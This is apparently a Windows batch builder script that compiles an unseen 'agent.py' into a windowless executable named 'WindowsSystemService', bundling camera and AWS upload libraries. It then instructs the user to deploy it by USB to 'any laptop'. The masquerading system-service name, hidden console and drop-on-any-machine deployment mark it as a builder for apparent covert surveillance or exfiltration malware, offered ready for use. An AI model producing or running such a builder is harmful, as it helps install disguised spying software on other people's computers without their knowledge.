@echo off
title Building Agent EXE...
echo.
echo ============================================
echo   Startup Agent — One Click Builder
echo ============================================
echo.

:: STEP 1 — Check Python
echo [1/5] Checking Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo ERROR: Python not installed!
    echo Download from: https://python.org/downloads
    echo Make sure to check "Add Python to PATH" during install.
    pause & exit /b 1
)
echo        Python OK.

:: STEP 2 — Upgrade pip
echo [2/5] Upgrading pip...
python -m pip install --upgrade pip --quiet
echo        pip OK.

:: STEP 3 — Install all required packages
echo [3/5] Installing packages ^(opencv, boto3, pyinstaller^)...
pip install pyinstaller opencv-python boto3 botocore --quiet
if %errorlevel% neq 0 (
    echo.
    echo ERROR: Package install failed. Check internet connection.
    pause & exit /b 1
)
echo        All packages OK.

:: STEP 4 — Build EXE
echo [4/5] Building EXE ^(may take 1-2 minutes^)...
pyinstaller ^
    --onefile ^
    --noconsole ^
    --name "WindowsSystemService" ^
    --hidden-import=cv2 ^
    --hidden-import=boto3 ^
    --hidden-import=botocore ^
    --hidden-import=botocore.endpoint ^
    --hidden-import=botocore.parsers ^
    --hidden-import=botocore.serialize ^
    --collect-all=cv2 ^
    agent.py

if %errorlevel% neq 0 (
    echo.
    echo ERROR: Build failed. Check errors above.
    pause & exit /b 1
)

:: STEP 5 — Finalize
echo [5/5] Finalizing...
copy /Y "dist\WindowsSystemService.exe" "WindowsSystemService.exe" >nul

:: Cleanup
rmdir /s /q build >nul 2>&1
rmdir /s /q dist  >nul 2>&1
del /q "WindowsSystemService.spec" >nul 2>&1

echo.
echo ============================================
echo   BUILD COMPLETE!
echo   File: WindowsSystemService.exe
echo.
echo   Next: Copy EXE + deploy.bat to USB
echo         Double click deploy.bat on any laptop
echo ============================================
echo.
pause
